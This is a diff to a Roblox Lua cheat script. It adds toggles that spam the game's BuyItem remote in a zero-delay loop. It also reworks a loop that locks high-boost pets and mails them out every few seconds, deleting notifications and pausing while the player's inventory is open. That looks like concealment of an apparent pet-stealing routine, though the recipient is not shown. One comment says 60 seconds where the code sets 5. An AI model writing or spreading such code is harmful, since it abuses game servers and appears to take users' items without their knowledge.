@@ -175,12 +175,155 @@ wait()
     end
 end)
 
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Evil Merchant 1", Default = false})
+
+local isRunning = false
+
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "Evil Merchant",
+                    [2] = 1
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("LimitedMerchantService"):WaitForChild("RF"):WaitForChild("BuyItem"):InvokeServer(unpack(args))
+                
+                             -- Sleep for a short period to prevent overwhelming the server
+                wait(0)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
+
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Evil Merchant 2", Default = false})
+
+local isRunning = false
+
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "Evil Merchant",
+                    [2] = 2
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("LimitedMerchantService"):WaitForChild("RF"):WaitForChild("BuyItem"):InvokeServer(unpack(args))
+                
+                             -- Sleep for a short period to prevent overwhelming the server
+                wait(0)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
+
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Evil Merchant 3", Default = false})
+
+local isRunning = false
+
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "Evil Merchant",
+                    [2] = 3
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("LimitedMerchantService"):WaitForChild("RF"):WaitForChild("BuyItem"):InvokeServer(unpack(args))
+                
+                             -- Sleep for a short period to prevent overwhelming the server
+                wait(0)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
 
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Evil Merchant 4", Default = false})
 
+local isRunning = false
 
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "Evil Merchant",
+                    [2] = 4
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("LimitedMerchantService"):WaitForChild("RF"):WaitForChild("BuyItem"):InvokeServer(unpack(args))
+                
+                             -- Sleep for a short period to prevent overwhelming the server
+                wait(0)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
 
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Evil Merchant 5", Default = false})
 
+local isRunning = false
 
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "Evil Merchant",
+                    [2] = 5
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("LimitedMerchantService"):WaitForChild("RF"):WaitForChild("BuyItem"):InvokeServer(unpack(args))
+                
+                             -- Sleep for a short period to prevent overwhelming the server
+                wait(0)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
 
 
 
@@ -264,12 +407,45 @@ end)
 
 
 
-local player = game:GetService("Players").LocalPlayer
+
+
+
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer -- Use LocalPlayer directly
+
+local RunService = game:GetService("RunService")
+
+-- Create a flag to track whether the inventory is visible
+local isInventoryVisible = false
+
+local function checkInventoryVisibility(player)
+    if player and player:FindFirstChild("PlayerGui") then
+        local inventory = player.PlayerGui:FindFirstChild("GameUI")
+            and player.PlayerGui.GameUI:FindFirstChild("Menus")
+            and player.PlayerGui.GameUI.Menus:FindFirstChild("Inventory")
+
+        if inventory and inventory:IsA("GuiObject") then
+            if inventory.Visible then
+                isInventoryVisible = true -- Set flag to true when inventory is visible
+            else
+                isInventoryVisible = false -- Set flag to false when inventory is not visible
+            end
+        end
+    end
+end
+
+-- Run this function continuously using Heartbeat
+RunService.Heartbeat:Connect(function()
+    checkInventoryVisibility(player)
+end)
+
+-- Script continues only if Inventory is OFF
 local petsFolder = player.PlayerGui.GameUI.Menus.Inventory.Display.Pets.ScrollingFrame.Pets
 
 -- Store valid SpecialBoost values for both functions
 local specialBoosts = {}
-for i = 200, 500, 5 do
+for i = 280, 500, 1 do
     specialBoosts[tostring(i) .. "%"] = true
 end
 
@@ -333,20 +509,25 @@ local function sendPet(pet)
     end
 end
 
--- Start processing pets every 1 minute
+-- Start processing pets every 1 minute (skipping if inventory is visible)
 while true do
     -- Check and remove any existing notification
     local notification = player.PlayerGui:FindFirstChild("Notification")
     if notification then
         notification:Destroy()
     end
-    
-    -- Process each pet in the pets folder
+
+    -- Wait until inventory is not visible
+    while isInventoryVisible do
+        task.wait(1) -- Wait for 1 second before checking again
+    end
+
+    -- Only run the pet processing logic if the inventory is not visible
     for _, pet in ipairs(petsFolder:GetChildren()) do
         lockPet(pet)  -- Lock the pet if valid
         sendPet(pet)  -- Send the pet to the mailbox if valid
     end
     
     -- Wait 60 seconds before running the loop again
-    task.wait(60)
+    task.wait(5)  -- Increased wait time to 60 seconds
 end
